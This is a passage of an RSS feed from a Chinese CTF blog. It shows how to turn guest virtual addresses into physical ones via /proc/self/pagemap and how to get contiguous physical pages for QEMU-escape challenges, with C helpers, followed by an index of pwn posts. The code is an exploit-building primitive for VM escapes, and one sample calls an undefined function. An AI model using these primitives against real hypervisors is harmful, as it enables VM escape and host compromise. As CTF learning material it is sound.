<a class="sourceLine" id="cb7-33" title="33">    <span class="co">//这跟上面的右移9正好对应，但是为什么要 &amp; ~7 ,因为你  vir &gt;&gt; 12 &lt;&lt; 3 , 跟vir &gt;&gt; 9 是有区别的，vir &gt;&gt; 12 &lt;&lt; 3低3位肯定是0，所以通过&amp; ~7将低3位置0</span></a>
<a class="sourceLine" id="cb7-34" title="34">    <span class="co">// int page_size=getpagesize();</span></a>
<a class="sourceLine" id="cb7-35" title="35">    <span class="co">// unsigned long vir_page_idx = vir/page_size;</span></a>
<a class="sourceLine" id="cb7-36" title="36">    <span class="co">// unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);</span></a>
<a class="sourceLine" id="cb7-37" title="37"></a>
<a class="sourceLine" id="cb7-38" title="38">    lseek(fd, offset, SEEK_SET);</a>
<a class="sourceLine" id="cb7-39" title="39">    read(fd, &amp;pme, <span class="dv">8</span>);</a>
<a class="sourceLine" id="cb7-40" title="40">    <span class="co">// 确保页面存在——page is present.</span></a>
<a class="sourceLine" id="cb7-41" title="41">    <span class="cf">if</span> (!(pme &amp; PFN_PRESENT))</a>
<a class="sourceLine" id="cb7-42" title="42">        <span class="cf">return</span> -<span class="dv">1</span>;</a>
<a class="sourceLine" id="cb7-43" title="43">    <span class="co">// physical frame number </span></a>
<a class="sourceLine" id="cb7-44" title="44">    gfn = pme &amp; PFN_PFN;</a>
<a class="sourceLine" id="cb7-45" title="45">    <span class="cf">return</span> gfn;</a>
<a class="sourceLine" id="cb7-46" title="46">}</a>
<a class="sourceLine" id="cb7-47" title="47"></a>
<a class="sourceLine" id="cb7-48" title="48"><span class="dt">uint64_t</span> gva_to_gpa(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb7-49" title="49">{</a>
<a class="sourceLine" id="cb7-50" title="50">    <span class="dt">uint64_t</span> gfn = gva_to_gfn(addr);</a>
<a class="sourceLine" id="cb7-51" title="51">    assert(gfn != -<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb7-52" title="52">    <span class="cf">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="dt">uint64_t</span>)addr);</a>
<a class="sourceLine" id="cb7-53" title="53">}</a>
<a class="sourceLine" id="cb7-54" title="54"></a>
<a class="sourceLine" id="cb7-55" title="55"><span class="dt">int</span> main()</a>
<a class="sourceLine" id="cb7-56" title="56">{</a>
<a class="sourceLine" id="cb7-57" title="57">    <span class="dt">uint8_t</span> *ptr;</a>
<a class="sourceLine" id="cb7-58" title="58">    <span class="dt">uint64_t</span> ptr_mem;</a>
<a class="sourceLine" id="cb7-59" title="59">    </a>
<a class="sourceLine" id="cb7-60" title="60">    fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</a>
<a class="sourceLine" id="cb7-61" title="61">    <span class="cf">if</span> (fd &lt; <span class="dv">0</span>) {</a>
<a class="sourceLine" id="cb7-62" title="62">        perror(<span class="st">&quot;open&quot;</span>);</a>
<a class="sourceLine" id="cb7-63" title="63">        exit(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb7-64" title="64">    }</a>
<a class="sourceLine" id="cb7-65" title="65">    </a>
<a class="sourceLine" id="cb7-66" title="66">    ptr = malloc(<span class="dv">256</span>);</a>
<a class="sourceLine" id="cb7-67" title="67">    strcpy(ptr, <span class="st">&quot;Where am I?&quot;</span>);</a>
<a class="sourceLine" id="cb7-68" title="68">    printf(<span class="st">&quot;%s</span><span class="sc">\n</span><span class="st">&quot;</span>, ptr);</a>
<a class="sourceLine" id="cb7-69" title="69">    ptr_mem = gva_to_gpa(ptr);</a>
<a class="sourceLine" id="cb7-70" title="70">    printf(<span class="st">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span>, ptr_mem);</a>
<a class="sourceLine" id="cb7-71" title="71"></a>
<a class="sourceLine" id="cb7-72" title="72">    getchar();</a>
<a class="sourceLine" id="cb7-73" title="73">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb7-74" title="74">}</a></code></pre></div>
<p>具体可以看我的这一篇文章：<a href="https://blog.mark0519.com/#/pwnable/221108-gva2gpa">Document (mark0519.com)</a></p>]]></description>
    <pubDate>Sun, 13 Nov 2022 21:52:48 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[虚拟地址到物理地址]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221108-gva2gpa</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221108-gva2gpa</guid>
    <description><![CDATA[<h1 id="虚拟地址到物理地址">虚拟地址到物理地址</h1>
<h1 id="x00-开始之前">0x00 开始之前</h1>
<p>先前看一个<a href="https://blog.mark0519.com/#/pwnable/221025-qemu-basic?id=_0x02-hws2021-fastcp">qemu逃逸题</a>遇到:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1">cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="dv">8</span> * v9, &amp;cp_info, <span class="bn">0x18</span><span class="bu">uLL</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-2" title="2">cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-3" title="3">cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">1</span>);</a></code></pre></div>
<p>主要是第一次遇到这个函数：<strong>cpu_physical_memory_rw()</strong></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1"><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</a>
<a class="sourceLine" id="cb2-2" title="2">                            hwaddr len, <span class="dt">bool</span> is_write);</a>
<a class="sourceLine" id="cb2-3" title="3"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</a>
<a class="sourceLine" id="cb2-4" title="4">                                            <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb2-5" title="5">{</a>
<a class="sourceLine" id="cb2-6" title="6">    cpu_physical_memory_rw(addr, buf, len, false);</a>
<a class="sourceLine" id="cb2-7" title="7">}</a>
<a class="sourceLine" id="cb2-8" title="8"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</a>
<a class="sourceLine" id="cb2-9" title="9">                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb2-10" title="10">{</a>
<a class="sourceLine" id="cb2-11" title="11">    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</a>
<a class="sourceLine" id="cb2-12" title="12">}</a></code></pre></div>
<p>也就是说:</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``false``)</a></code></pre></div>
<p>把物理地址hwaddr addr上的内容复制到虚拟地址void *buf上</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``true``)</a></code></pre></div>
<p>把虚拟地址void *buf的内容复制到物理地址hwaddr addr上</p>
<p>这就牵扯到了我们需要根据虚拟地址计算物理地址的问题</p>
<h1 id="x01-qemu内存概述">0x01 qemu内存概述</h1>
<h2 id="qemu-内存布局">1. qemu 内存布局</h2>
<p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如 CPU 线程、I/O 线程等）对应 qemu 进程的一个线程。</p>
<figure>
<img src="https://jjuku29a1d.feishu.cn/space/api/box/stream/download/asynccode/?code=ODNjYjQ4ZDY5NDcxNGU2ZDNhNjdiMWFjZjNmZGRjYTVfZ3paa1pBc09aWFcwT0xpME5ITkVHOVVrOUowelcyOExfVG9rZW46Ym94Y25KUzF3eGQ0Yk53TGNxV2F6aFNIcDRkXzE2Njc5MTY2MTk6MTY2NzkyMDIxOV9WNA" alt="img" /><figcaption>img</figcaption>
</figure>
<p>也就是说，对于qemu来说，地址映射具体为：</p>
<p>GVA(虚拟机虚拟地址) -&gt; GPA(虚拟机物理地址) -&gt; HVA(宿主机虚拟地址) -&gt; HPA(宿主机物理地址)</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" title="1">                        Guest&#39; processes</a>
<a class="sourceLine" id="cb5-2" title="2">                     +--------------------+</a>
<a class="sourceLine" id="cb5-3" title="3">Virtual addr space   |                    |</a>
<a class="sourceLine" id="cb5-4" title="4">                     +--------------------+</a>
<a class="sourceLine" id="cb5-5" title="5">                     |                    |</a>
<a class="sourceLine" id="cb5-6" title="6">                     \__   Page Table     \__</a>
<a class="sourceLine" id="cb5-7" title="7">                        \                    \</a>
<a class="sourceLine" id="cb5-8" title="8">                         |                    |  Guest kernel</a>
<a class="sourceLine" id="cb5-9" title="9">                    +----+--------------------+----------------+</a>
<a class="sourceLine" id="cb5-10" title="10">Guest&#39;s phy. memory |    |                    |                |</a>
<a class="sourceLine" id="cb5-11" title="11">                    +----+--------------------+----------------+</a>
<a class="sourceLine" id="cb5-12" title="12">                    |                                          |</a>
<a class="sourceLine" id="cb5-13" title="13">                    \__                                        \__</a>
<a class="sourceLine" id="cb5-14" title="14">                       \                                          \</a>
<a class="sourceLine" id="cb5-15" title="15">                        |             QEMU process                 |</a>
<a class="sourceLine" id="cb5-16" title="16">                   +----+------------------------------------------+</a>
<a class="sourceLine" id="cb5-17" title="17">Virtual addr space |    |                                          |</a>
<a class="sourceLine" id="cb5-18" title="18">                   +----+------------------------------------------+</a>
<a class="sourceLine" id="cb5-19" title="19">                   |                                               |</a>
<a class="sourceLine" id="cb5-20" title="20">                    \__                Page Table                   \__</a>
<a class="sourceLine" id="cb5-21" title="21">                       \                                               \</a>
<a class="sourceLine" id="cb5-22" title="22">                        |                                               |</a>
<a class="sourceLine" id="cb5-23" title="23">                   +----+-----------------------------------------------++</a>
<a class="sourceLine" id="cb5-24" title="24">Physical memory    |    |                                               ||</a>
<a class="sourceLine" id="cb5-25" title="25">                   +----+-----------------------------------------------++</a></code></pre></div>
<p>需要注意的是，虽然上图看起来虚拟地址到物理地址的映射是连续的，但实际上并不是。</p>
<p>对于QEMU来说，一个内存页的大小是0x1000，如果我们使用mmap申请一个0x2000大小的空间，那么他们的虚拟地址确实是连续的，但是物理地址页并不一定连续。</p>
<ol type="1">
<li><h2 id="申请连续物理内存的两种方式">申请连续物理内存的两种方式</h2></li>
<li><h3 id="爆破">爆破</h3></li>
</ol>
<blockquote>
<p>多次申请直到物理内存连续</p>
</blockquote>
<p>字面意思，多次mmap 0x1000大小的内存，并根据虚拟地址计算物理地址，一直到出现两个连续的物理内存页。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1"><span class="dt">size_t</span> buf0, buf1;</a>
<a class="sourceLine" id="cb6-2" title="2"></a>
<a class="sourceLine" id="cb6-3" title="3"><span class="dt">void</span> get_pages()</a>
<a class="sourceLine" id="cb6-4" title="4">{</a>
<a class="sourceLine" id="cb6-5" title="5">    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb6-6" title="6">    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb6-7" title="7">    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-8" title="8">    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb6-9" title="9">    <span class="dt">int</span> n = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb6-10" title="10">    buf[n] = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb6-11" title="11">    arry[n++] = arr;</a>
<a class="sourceLine" id="cb6-12" title="12">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</a>
<a class="sourceLine" id="cb6-13" title="13">    {</a>
<a class="sourceLine" id="cb6-14" title="14">        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-15" title="15">        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb6-16" title="16">        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb6-17" title="17">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</a>
<a class="sourceLine" id="cb6-18" title="18">        {</a>
<a class="sourceLine" id="cb6-19" title="19">            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</a>
<a class="sourceLine" id="cb6-20" title="20">            {</a>
<a class="sourceLine" id="cb6-21" title="21">                LOG(<span class="st">&quot;consist pages&quot;</span>);</a>
<a class="sourceLine" id="cb6-22" title="22">                <span class="cf">if</span> (fn &gt; buf[j])</a>
<a class="sourceLine" id="cb6-23" title="23">                {</a>
<a class="sourceLine" id="cb6-24" title="24">                    buf0 = arry[j];</a>
<a class="sourceLine" id="cb6-25" title="25">                    buf1 = arr;</a>
<a class="sourceLine" id="cb6-26" title="26">                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb6-27" title="27">                }</a>
<a class="sourceLine" id="cb6-28" title="28">                <span class="cf">else</span></a>
<a class="sourceLine" id="cb6-29" title="29">                {</a>
<a class="sourceLine" id="cb6-30" title="30">                    buf1 = arry[j];</a>
<a class="sourceLine" id="cb6-31" title="31">                    buf0 = arr;</a>
<a class="sourceLine" id="cb6-32" title="32">                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb6-33" title="33">                }</a>
<a class="sourceLine" id="cb6-34" title="34">                <span class="cf">return</span>;</a>
<a class="sourceLine" id="cb6-35" title="35">            }</a>
<a class="sourceLine" id="cb6-36" title="36">        }</a>
<a class="sourceLine" id="cb6-37" title="37">        buf[n] = fn;</a>
<a class="sourceLine" id="cb6-38" title="38">        arry[n++] = arr;</a>
<a class="sourceLine" id="cb6-39" title="39">    }</a>
<a class="sourceLine" id="cb6-40" title="40">}</a></code></pre></div>
<h2 id="申请linux大页">2. 申请linux大页</h2>
<blockquote>
<p>主动申请连续物理地址</p>
</blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1055041">Linux申请大页内存(mmap)</a></p>
<p>操作系统对内存采用多级页表和分页进行管理，操作系统每个页默认大小为4KB（0x1000）。</p>
<p>如果进程使用的内存过大，比如1GB，这样会在页表中占用 1GB / 4KB = 262144个页表项，而系统TLB可以容纳的页表项远小于这个数量。当多个内存密集型应用访问内存时，会造成过多的TLB未命中，因此在特定情况下会需要减少未命中次数，一个可行的办法就是增大每个页的尺寸。</p>
<p>操作系统默认支持的大页是2MB（512 * 0x1000 ），当使用1GB内存时，在页表中将占用 1GB / 2MB = 512个页表项，可以大大提升TLB命中率，进而提升应用性能。</p>
<blockquote>
<p>申请后还需访存一下，这里使用了memset，确保物理页被真实映射。</p>
</blockquote>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb7-1" title="1">system(<span class="st">&quot;sysctl vm.nr_hugepages=30&quot;</span>); <span class="co">// 开启大页</span></a>
<a class="sourceLine" id="cb7-2" title="2"><span class="dt">void</span> * buf = mmap(<span class="dv">0</span>, <span class="dv">512</span> * <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS | <span class="bn">0x40000</span>, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb7-3" title="3">memset(buf,<span class="ch">&#39;a&#39;</span>,<span class="bn">0x2000</span>);</a></code></pre></div>
<h1 id="x02-gva2gpa">0x02 GVA2GPA</h1>
<h2 id="原理">1. 原理</h2>
<p>将虚拟地址转换为物理地址需要访问页表，然而只有内核态的程序才能访问到页表，用户态程序无权访问。此外，Linux 系统提供了一种用户态程序访问页表的方式，通过查看 <code>/proc/pid/pagemap</code> 文件可得到虚拟内存页映射与物理内存页的映射关系。显然后者更为简单，所以下面使用该方法实现地址转换。</p>
<p>根据内核文档可知，每个虚拟页在 <code>/proc/pid/pagemap</code> 中对应一项长度为 64 bits 的数据，其中 Bit 63 为 page present，表示物理内存页是否已存在；若物理页已存在，则 Bits 0-54 表示物理页号。此外，需要 root 权限的进程才能读取 <code>/proc/pid/pagemap</code> 中的内容。</p>
<blockquote>
<p>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow userspace programs to examine the page tables and related information by reading files in /proc.</p>
<p>There are four components to pagemap:</p>
<p>*/proc/pid/pagemap. This file lets a userspace process find out which physical frame each virtual page is mapped to. It contains one 64-bit value for each virtual page, containing the following data (from fs/proc/task_mmu.c, above pagemap_read):</p>
<p>* Bits 0-54 page frame number (PFN) if present</p>
<p>* Bits 0-4 swap type if swapped</p>
<p>* Bits 5-54 swap offset if swapped</p>
<p>* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</p>
<p>* Bit 56 page exclusively mapped (since 4.2)</p>
<p>* Bits 57-60 zero</p>
<p>* Bit 61 page is file-page or shared-anon (since 3.5)</p>
<p>* Bit 62 page swapped</p>
<p>* Bit 63 page present</p>
<p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs. In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from 4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN. Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p>
</blockquote>
<p>根据以上信息，利用 <code>/proc/pid/pagemap</code> 可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1）计算虚拟地址所在虚拟页对应的数据项在 <code>/proc/pid/pagmap</code> 中的偏移；</p>
<pre><code>offset = (viraddr / pagesize) * sizeof(uint64_t)</code></pre>
<p>2）读取长度为 64 bits 的数据项；</p>
<p>3）根据 Bit 63 判断物理内存页是否存在；</p>
<p>4）若物理内存页已存在，则取 bits 0 - 54 作为物理页号；</p>
<p>5）计算出物理页起始地址加上页内偏移即得到物理地址；</p>
<pre><code>phyaddr = pageframenum * pagesize + viraddr % pagesize;</code></pre>
<h2 id="实现">2.实现</h2>
<p>具体实现代码如下：</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span><span class="pp">      </span></a>
<a class="sourceLine" id="cb10-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb10-3" title="3"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb10-4" title="4"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb10-5" title="5"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb10-6" title="6">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb10-7" title="7"></a>
<a class="sourceLine" id="cb10-8" title="8">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb10-9" title="9">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb10-10" title="10">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb10-11" title="11">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-12" title="12">    }</a>
<a class="sourceLine" id="cb10-13" title="13"></a>
<a class="sourceLine" id="cb10-14" title="14">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb10-15" title="15">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb10-16" title="16"></a>
<a class="sourceLine" id="cb10-17" title="17">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb10-18" title="18">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb10-19" title="19">        close(fd);</a>
<a class="sourceLine" id="cb10-20" title="20">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-21" title="21">    }</a>
<a class="sourceLine" id="cb10-22" title="22"></a>
<a class="sourceLine" id="cb10-23" title="23">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb10-24" title="24">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb10-25" title="25">        close(fd);</a>
<a class="sourceLine" id="cb10-26" title="26">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-27" title="27">    }</a>
<a class="sourceLine" id="cb10-28" title="28"></a>
<a class="sourceLine" id="cb10-29" title="29">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb10-30" title="30">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb10-31" title="31">        close(fd);</a>
<a class="sourceLine" id="cb10-32" title="32">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-33" title="33">    }</a>
<a class="sourceLine" id="cb10-34" title="34"></a>
<a class="sourceLine" id="cb10-35" title="35">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb10-36" title="36">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb10-37" title="37"></a>
<a class="sourceLine" id="cb10-38" title="38">    close(fd);</a>
<a class="sourceLine" id="cb10-39" title="39"></a>
<a class="sourceLine" id="cb10-40" title="40">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb10-41" title="41">}</a>
<a class="sourceLine" id="cb10-42" title="42"><span class="dt">int</span> main()</a>
<a class="sourceLine" id="cb10-43" title="43">{</a>
<a class="sourceLine" id="cb10-44" title="44">    <span class="dt">size_t</span> phyaddr;</a>
<a class="sourceLine" id="cb10-45" title="45">    <span class="dt">size_t</span> viraddr;</a>
<a class="sourceLine" id="cb10-46" title="46">    <span class="dt">uint32_t</span> pid;</a>
<a class="sourceLine" id="cb10-47" title="47">    printf(<span class="st">&quot;pid = &quot;</span>);</a>
<a class="sourceLine" id="cb10-48" title="48">    scanf(<span class="st">&quot;%u&quot;</span>, &amp;pid);</a>
<a class="sourceLine" id="cb10-49" title="49">    printf(<span class="st">&quot;virtual address = &quot;</span>);</a>
<a class="sourceLine" id="cb10-50" title="50">    scanf(<span class="st">&quot;%x&quot;</span>, &amp;viraddr);</a>
<a class="sourceLine" id="cb10-51" title="51">    phyaddr = virtual_to_physical(pid, viraddr);</a>
<a class="sourceLine" id="cb10-52" title="52">    printf(<span class="st">&quot;virtual address = %p,physical address = %p</span><span class="sc">\n</span><span class="st">&quot;</span>, viraddr, phyaddr);</a>
<a class="sourceLine" id="cb10-53" title="53">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-54" title="54">}</a></code></pre></div>
<h1 id="x03-参考连接">0x03 参考连接</h1>
<p>https://blog.mark0519.com/#/pwnable/221025-qemu-basic</p>
<p>http://0x4c43.cn/2018/0508/linux-dynamic-link/</p>
<p>https://juniorprincewang.github.io/2018/07/20/qemu-memory/</p>
<p>https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0</p>
<p>https://www.anquanke.com/post/id/256977#h3-3</p>
<p>http://a1ex.online/2021/10/13/%E4%BB%8Eqemu%E9%80%83%E9%80%B8%E5%88%B0%E9%80%83%E8%B7%91/</p>]]></description>
    <pubDate>Sun, 13 Nov 2022 21:52:48 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Pwnable]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/README</guid>
    <description><![CDATA[<h1 id="pwnable">Pwnable</h1>
<blockquote>
<p>纸上得来终觉浅，绝知此事要躬行。</p>
</blockquote>
<h2 id="tsctf-2022">TSCTF 2022</h2>
<ul>
<li><strong>[22/4/25]</strong> <a href="/pwnable/220425-tsctf2022">TSCTF 2022</a></li>
</ul>
<h2 id="kernel-学习">Kernel 学习</h2>
<ul>
<li><strong>[22/04/27]</strong> <a href="/pwnable/220427-kernel-basic">kernel basic</a></li>
<li><strong>[220/4/28]</strong> <a href="/pwnable/220428-kernel-rop1">kernel ROP1</a></li>
<li><strong>[22/04/29]</strong> <a href="/pwnable/220429-kernel-rop2">kernel ROP2</a></li>
<li><strong>[22/05/01]</strong> <a href="/pwnable/220501-kernel-rop3">kernel ROP3</a></li>
<li><strong>[22/05/02]</strong> <a href="/pwnable/220502-kernel-rop4">kernel ROP4</a></li>
</ul>
<h2 id="qemu逃逸">QEMU逃逸</h2>
<ul>
<li><strong>[22/10/25]</strong> <a href="/pwnable/221025-qemu-basic">Qemu basic</a></li>
<li><strong>[22/11/08]</strong> <a href="/pwnable/221108-gva2gpa">Gva2Gpa</a></li>
</ul>
<h2 id="刷题">刷题</h2>
<ul>
<li><p><strong>[22/05/18]</strong> <a href="/pwnable/220518-HTB1">HackTheBox 1</a></p></li>
<li><p><strong>[22/05/19]</strong> <a href="/pwnable/220519-HTB2">HackTheBox 2</a></p></li>
</ul>
<h2 id="house-of-xxx">House of xxx</h2>
<ul>
<li><strong>[22/05/26]</strong> <a href="/pwnable/220526-house_of_emma">House of Emma</a></li>
<li><strong>[22/07/66]</strong> <a href="/pwnable/220716-house_of_apple">House of Apple</a></li>
</ul>
<h2 id="总结">总结</h2>
<ul>
<li><strong>[22/07/03]</strong> <a href="/pwnable/2200703-glibc-233UAF">Glibc-2.33UAF利用</a></li>
</ul>]]></description>
    <pubDate>Tue, 8 Nov 2022 22:15:20 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[一、QEMU逃逸  --  basic ]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221025-qemu-basic</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221025-qemu-basic</guid>
    <description><![CDATA[<h1 id="一qemu逃逸-basic">一、QEMU逃逸 – basic</h1>
<blockquote>
<p><del>玩不懂kernel的菜鸡来霍霍qemu辣</del></p>
</blockquote>
<h2 id="x00-lspci">0x00 lspci</h2>
<p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分3位表示功能号。下面是<code>lspci</code>的输出，其中<code>pci</code>设备的地址，在最头部给出，由于<code>pc</code>设备总只有一个0号域，所以会省略域。</p>
<figure>
<img src="https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v -t</code>会用树状图的形式输出pci设备，会显得更加直观</p>
<figure>
<img src="https://p2.ssl.qhimg.com/t0106de490068b32c99.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v</code>就能输出设备的详细信息</p>
<figure>
<img src="https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>仔细观察相关的输出，可以从中知道<code>mmio</code>的地址是<code>0xfebf1000</code>，<code>pmio</code>的端口是<code>0xc050</code>。</p>
<figure>
<img src="https://p1.ssl.qhimg.com/t0129b36299082dc698.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p>
<figure>
<img src="https://p3.ssl.qhimg.com/t01ddba05509f456110.png" alt="image" /><figcaption>image</figcaption>
</figure>
<figure>
<img src="https://p0.ssl.qhimg.com/t016c20a809c748def6.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>每个设备的目录下<code>resource0</code> 对应<code>MMIO</code>空间。<code>resource1</code> 对应<code>PMIO</code>空间。 <code>resource</code>文件里面会记录相关的数据，第一行就是<code>mimo</code>的信息，从左到右是：起始地址、结束地址、标识位。</p>
<h2 id="x01-antctf-2021-d3dev">0x01 AntCTF 2021 d3dev</h2>
<h3 id="分析">1. 分析</h3>
<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb1-1" title="1"><span class="co">#!/bin/sh</span></a>
